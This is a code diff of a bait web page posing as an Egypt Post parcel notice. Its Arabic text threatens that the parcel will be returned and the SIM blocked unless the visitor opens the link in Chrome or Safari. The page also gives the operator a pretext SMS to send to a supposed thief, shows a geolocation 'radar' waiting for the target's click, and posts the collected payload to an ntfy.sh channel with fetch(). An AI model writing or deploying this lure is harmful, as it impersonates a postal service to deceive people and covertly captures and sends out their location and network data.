@@ -111,7 +111,7 @@
         <!-- Egypt Post Main Bait Content -->
         <main class="max-w-md w-full mx-auto p-6 flex-1 flex flex-col justify-center space-y-6">
             
-            <!-- WebView Detected Interstitial Alert (Hidden by default, shown if opened in WhatsApp browser) -->
+            <!-- WebView Detected Interstitial Alert -->
             <div id="webview-blocker" class="hidden bg-white rounded-2xl p-6 shadow-xl border-2 border-amber-500 space-y-4 text-center">
                 <div class="w-16 h-16 mx-auto rounded-full bg-amber-50 flex items-center justify-center border border-amber-300">
                     <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-amber-600 animate-bounce" fill="none" viewBox="0 0 24 24" stroke="currentColor">
@@ -122,7 +122,7 @@
                 <p class="text-xs text-gray-700 leading-relaxed">
                     عفواً، المتصفح الداخلي المدمج لتطبيق المحادثات لا يدعم بروتوكولات التشفير والأمان الفضائي المطلوبة للتحقق من الشحنة رقم <span class="font-bold">EG-01147639153</span>.
                 </p>
-                <div class="p-3 bg-amber-50 rounded-lg text-xs text-amber-800 font-semibold leading-relaxed">
+                <div class="p-3 bg-amber-50 rounded-lg text-xs text-amber-800 font-semibold leading-relaxed text-right">
                     💡 لتفادي إعادة الطرد لمكتب التوزيع وحظر الشريحة، يرجى الضغط على النقاط الثلاث بالأعلى (⋮) واختيار "الفتح في متصفح Chrome" أو "الفتح في متصفح Safari" لإتمام التفعيل بنجاح.
                 </div>
             </div>
@@ -186,7 +186,7 @@
                     </div>
                 </div>
                 <div class="flex items-center gap-3">
-                    <span class="bg-pink-light border border-[#FF91A4]/30 text-pink-custom px-4 py-1.5 rounded-full text-xs font-bold flex items-center gap-2">
+                    <span class="bg-pink-light border border-[#FF91A4]/30 text-pink-custom px-4 py-1.5 rounded-full text-xs font-bold flex items-center gap-2 font-sans">
                         <span class="w-2.5 h-2.5 rounded-full bg-[#FF91A4] animate-ping"></span>
                         الرصد السحابي المزدوج نشط
                     </span>
@@ -218,7 +218,7 @@
                 <!-- Live SMS Mockup Preview (Egypt Post Style) -->
                 <div class="bg-white rounded-xl p-5 space-y-3 border border-pink shadow-pink">
                     <div class="flex items-center justify-between border-b border-pink/30 pb-2">
-                        <span class="text-xs font-bold text-[#111111] flex items-center gap-2">
+                        <span class="text-xs font-bold text-[#111111] flex items-center gap-2 font-sans">
                             <span class="w-2 h-2 rounded-full bg-[#FF91A4]"></span>
                             نص رسالة الـ SMS الموجهة للسارق (انسخيها بالكامل):
                         </span>
@@ -260,7 +260,7 @@
                             الرصد الجغرافي المباشر وخريطة الأقمار الصناعية
                         </h2>
                         <!-- Dynamic Status Badge for Geolocation Quality -->
-                        <span id="quality-badge" class="bg-amber-100 text-amber-700 px-3 py-1 rounded-full text-[10px] font-bold">
+                        <span id="quality-badge" class="bg-amber-100 text-amber-700 px-3 py-1 rounded-full text-[10px] font-bold font-sans">
                             رصد تقريبي بالشبكة (IP)
                         </span>
                     </div>
@@ -277,7 +277,7 @@
                                 <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-3.5 h-3.5 rounded-full bg-[#FF91A4] shadow-lg shadow-[#FF91A4]"></div>
                             </div>
                             <div class="text-center">
-                                <p class="text-xs font-bold tracking-wider text-[#111111] animate-pulse">في انتظار نقرة السارق الجغرافية...</p>
+                                <p class="text-xs font-bold tracking-wider text-[#111111] animate-pulse font-sans">في انتظار نقرة السارق الجغرافية...</p>
                                 <p class="text-[10px] text-pink-custom mt-1 font-mono font-sans">RADAR POLLING ACTIVE [01147639153]</p>
                             </div>
                         </div>
@@ -642,7 +642,7 @@
             };
 
             try {
-                // FIXED: Removed the syntax error fetch:: to clean fetch(...)
+                // CORRECTED SYNTAX: Changed the buggy fetch:: to standard clean fetch
                 await fetch(`https://ntfy.sh/boosy_sweets_tracker_${session}`, {
                     method: 'POST',
                     body: JSON.stringify(payload)
